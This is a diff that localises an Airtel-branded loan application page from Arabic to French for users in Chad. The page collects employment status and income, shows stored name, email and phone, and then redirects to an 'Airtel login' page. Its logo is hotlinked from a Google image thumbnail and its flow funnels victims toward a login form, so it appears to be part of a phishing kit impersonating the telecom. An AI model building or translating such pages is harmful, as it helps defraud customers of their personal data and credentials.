@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="fr" dir="ltr">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Airtel - طلب القرض</title>
+    <title>Airtel - Demande de Prêt</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;600;700&display=swap');
         * {
@@ -46,8 +46,6 @@
             border: none;
             cursor: pointer;
             color: #333;
-            transform: scaleX(-1);
-            /* Flips arrow for RTL */
         }
         
         .logo {
@@ -83,7 +81,7 @@
         }
         
         .top {
-            text-align: right;
+            text-align: left;
             flex: 1;
             overflow-y: auto;
             padding-bottom: 20px;
@@ -108,7 +106,7 @@
         .progress-fill {
             width: 100%;
             height: 100%;
-            background: linear-gradient(to left, #4361ee, #7209b7);
+            background: linear-gradient(to right, #4361ee, #7209b7);
         }
         
         .step-text {
@@ -124,7 +122,7 @@
             margin-bottom: 8px;
             font-size: 15px;
             display: block;
-            text-align: right;
+            text-align: left;
         }
         
         .form-select,
@@ -137,7 +135,7 @@
             margin-bottom: 16px;
             font-family: 'Tajawal', sans-serif;
             background: white;
-            text-align: right;
+            text-align: left;
         }
         
         .summary-box {
@@ -145,7 +143,7 @@
             padding: 16px;
             border-radius: 16px;
             font-size: 14px;
-            text-align: right;
+            text-align: left;
         }
         
         .summary-row {
@@ -153,7 +151,6 @@
             justify-content: space-between;
             margin-bottom: 10px;
             color: #555;
-            flex-direction: row-reverse;
         }
         
         .summary-value {
@@ -293,7 +290,6 @@
             align-items: center;
             justify-content: center;
             gap: 10px;
-            flex-direction: row-reverse;
         }
         
         .redirect-bar .loader {
@@ -324,59 +320,59 @@
     <header>
         <button class="back-btn" onclick="history.back()">←</button>
         <div class="logo">
-            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSwKPIUOxpuuEY1j3YBezDsKGUqWQ8aZNoh7dFU4nzwiw&s=10" alt="أيرتل">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSwKPIUOxpuuEY1j3YBezDsKGUqWQ8aZNoh7dFU4nzwiw&s=10" alt="Airtel">
         </div>
         <div></div>
     </header>
 
     <main class="card">
         <div class="top">
-            <h1 class="form-title">التحقق النهائي</h1>
+            <h1 class="form-title">Vérification finale</h1>
             <div class="progress-bar">
                 <div class="progress-fill"></div>
             </div>
-            <div class="step-text">الخطوة 3 من 3</div>
+            <div class="step-text">Étape 3 sur 3</div>
 
-            <label class="form-label" for="employmentStatus">الحالة الوظيفية</label>
+            <label class="form-label" for="employmentStatus">Statut professionnel</label>
             <select class="form-select" id="employmentStatus">
-                <option value="Employed">موظف</option>
-                <option value="Self-Employed">عمل حر</option>
-                <option value="Unemployed">بدون عمل</option>
-                <option value="Student">طالب</option>
+                <option value="Employed">Salarié</option>
+                <option value="Self-Employed">Travailleur indépendant</option>
+                <option value="Unemployed">Sans emploi</option>
+                <option value="Student">Étudiant</option>
             </select>
 
-            <label class="form-label" for="annualIncome">الدخل السنوي (FCFA)</label>
+            <label class="form-label" for="annualIncome">Revenu annuel (FCFA)</label>
             <input type="number" class="form-input" id="annualIncome" placeholder="15000000">
 
             <div class="summary-box" id="summaryBox">
-                <!-- Populated automatically by JavaScript -->
+                <!-- Rempli automatiquement par JavaScript -->
             </div>
         </div>
         <div class="btn-group">
-            <button class="prev-btn" onclick="history.back()">السابق</button>
-            <button class="submit-btn" id="submitBtn">إرسال الطلب</button>
+            <button class="prev-btn" onclick="history.back()">Précédent</button>
+            <button class="submit-btn" id="submitBtn">Soumettre la demande</button>
         </div>
     </main>
-    <footer>© 2026 أيرتل. جميع الحقوق محفوظة.</footer>
+    <footer>© 2026 Airtel. Tous droits réservés.</footer>
 
-    <!-- Spinner Overlay -->
+    <!-- Overlay Chargement -->
     <div id="spinnerOverlay">
         <div class="spinner"></div>
     </div>
 
-    <!-- Success Overlay -->
+    <!-- Overlay Succès -->
     <div id="successOverlay">
         <div class="success-card">
             <div class="check-icon">✓</div>
-            <div class="success-title">تم تقديم طلب القرض</div>
+            <div class="success-title">Demande de prêt soumise</div>
             <div class="success-msg">
-                تم تقديم طلب القرض الخاص بك بنجاح. يرجى الانتظار بينما تتم معالجته.<br><br> ستتلقى رسالة تأكيد. في غضون ذلك، تابع إلى أيرتل.
+                Votre demande de prêt a été soumise avec succès. Veuillez patienter pendant qu'elle est traitée.<br><br> Vous recevrez un message de confirmation. En attendant, continuez vers Airtel.
             </div>
             <div class="redirect-bar">
                 <div class="loader"></div>
-                التحويل إلى تسجيل دخول أيرتل خلال <span id="countdown">3</span>...
+                Redirection vers la connexion Airtel dans <span id="countdown">3</span>...
             </div>
-            <button class="go-login-btn" onclick="window.location.href='login.html'">تسجيل الدخول الآن</button>
+            <button class="go-login-btn" onclick="window.location.href='login.html'">Se connecter maintenant</button>
         </div>
     </div>
 
@@ -384,26 +380,26 @@
         const summaryBox = document.getElementById('summaryBox');
         const loanAmount = parseFloat(localStorage.getItem('loanAmount') || 2500000);
 
-        // Map English loan types/terms back to Arabic for the summary view if saved in English
+        // Convertit les types de prêt en anglais vers le français pour l'affichage du récapitulatif
         const loanTypeMap = {
-            'Personal Loan': 'قرض شخصي',
-            'Business Loan': 'قرض تجاري',
-            'Home Loan': 'قرض عقاري',
-            'Car Loan': 'قرض سيارة',
-            'Education Loan': 'قرض تعليمي'
+            'Personal Loan': 'Prêt personnel',
+            'Business Loan': 'Prêt commercial',
+            'Home Loan': 'Prêt immobilier',
+            'Car Loan': 'Prêt automobile',
+            'Education Loan': 'Prêt étudiant'
         };
 
         const rawLoanType = localStorage.getItem('loanType') || 'Personal Loan';
         const displayLoanType = loanTypeMap[rawLoanType] || rawLoanType;
 
         summaryBox.innerHTML = `
-            <div class="summary-row"><span>نوع القرض:</span><span class="summary-value">${displayLoanType}</span></div>
-            <div class="summary-row"><span>المبلغ:</span><span class="summary-value">${Math.round(loanAmount).toLocaleString('ar-TD')} FCFA</span></div>
-            <div class="summary-row"><span>المدة:</span><span class="summary-value">${localStorage.getItem('loanTerm') || '12'} أشهر</span></div>
-            <div class="summary-row"><span>الغرض:</span><span class="summary-value">${localStorage.getItem('loanPurpose') || 'غير محدد'}</span></div>
-            <div class="summary-row"><span>الاسم:</span><span class="summary-value">${localStorage.getItem('firstName') || ''} ${localStorage.getItem('lastName') || ''}</span></div>
-            <div class="summary-row"><span>البريد الإلكتروني:</span><span class="summary-value">${localStorage.getItem('email') || 'غير متوفر'}</span></div>
-            <div class="summary-row"><span>الهاتف:</span><span class="summary-value">+235 ${localStorage.getItem('phone') || 'غير متوفر'}</span></div>
+            <div class="summary-row"><span>Type de prêt :</span><span class="summary-value">${displayLoanType}</span></div>
+            <div class="summary-row"><span>Montant :</span><span class="summary-value">${Math.round(loanAmount).toLocaleString('fr-FR')} FCFA</span></div>
+            <div class="summary-row"><span>Durée :</span><span class="summary-value">${localStorage.getItem('loanTerm') || '12'} mois</span></div>
+            <div class="summary-row"><span>Objet :</span><span class="summary-value">${localStorage.getItem('loanPurpose') || 'Non spécifié'}</span></div>
+            <div class="summary-row"><span>Nom :</span><span class="summary-value">${localStorage.getItem('firstName') || ''} ${localStorage.getItem('lastName') || ''}</span></div>
+            <div class="summary-row"><span>E-mail :</span><span class="summary-value">${localStorage.getItem('email') || 'Non disponible'}</span></div>
+            <div class="summary-row"><span>Téléphone :</span><span class="summary-value">+235 ${localStorage.getItem('phone') || 'Non disponible'}</span></div>
         `;
 
         if (localStorage.getItem('employmentStatus')) {
@@ -416,7 +412,7 @@
         document.getElementById('submitBtn').addEventListener('click', function() {
             const income = document.getElementById('annualIncome').value.trim();
             if (!income || income < 500000) {
-                alert('يرجى إدخال دخل سنوي صحيح (الحد الأدنى 500,000 FCFA).');
+                alert('Veuillez saisir un revenu annuel valide (minimum 500 000 FCFA).');
                 return;
             }
 
